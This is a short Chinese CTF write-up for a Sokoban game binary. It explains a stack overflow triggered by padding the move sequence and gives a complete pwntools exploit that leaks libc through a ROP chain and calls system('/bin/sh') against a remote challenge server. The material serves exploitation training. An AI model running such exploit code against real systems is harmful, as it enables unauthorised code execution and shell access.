# 推箱子

> 小明写了一个推箱子小游戏，但有一点小问题。

## 文件属性

|属性  |值    |
|------|------|
|Arch  |x64   |
|RELRO|Partial|
|Canary|off   |
|NX    |on    |
|PIE   |off   |
|strip |no    |
|libc  |2.27-3ubuntu1.6|

## 解题思路

简单的推箱子游戏，要求把箱子推到指定位置，完成后可以输入数据。
输入的长度的执行步骤的次数，可以通过 sw 这样的无效动作来刷高次数，从而引发缓冲区溢出，
打常规rop即可。

## EXPLOIT

```python
from pwn import *
context.terminal = ['tmux','splitw','-h']
GOLD_TEXT = lambda x: f'\x1b[33m{x}\x1b[0m'
EXE = './game'

def payload(lo:int):
    global sh
    if lo:
        sh = process(EXE)
        if lo & 2:
            gdb.attach(sh)
    else:
        sh = remote('222.67.132.186', 21956)
    libc = ELF('/home/Rocket/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc.so.6')
    elf = ELF(EXE)

    def genKey(leng:int) -> bytes:
        key = 'ddwwwwssdwwssassdwwwsssdww' # a right path to push boxes
        extend = key[:-2] + 'sw' * ((leng - len(key)) // 2) + key[-1]
        return extend.encode()

    gadgets = ROP(elf)
    ret = gadgets.ret.address
    rdi = gadgets.rdi.address
    sh.sendafter(b'move', genKey(0x5a0))
    sh.sendafter(b'name:', b'0'*0x578 + p64(rdi) + p64(elf.got['puts']) +
                 p64(elf.plt['puts']) + p64(elf.symbols['main']))

    putsLibc = u64(sh.recvline()[:6] + b'\0\0')
    libc.address = putsLibc - libc.symbols['puts']
    success(GOLD_TEXT(f'Leak libcBase: {libc.address:#x}'))

    sh.sendafter(b'move', genKey(0x5a0))
    sh.sendafter(b'name:', b'0'*0x578 + p64(rdi) + p64(next(libc.search(b'/bin/sh'))) +
                 p64(ret) + p64(libc.symbols['system']))

    sh.clean()
    sh.interactive()
```
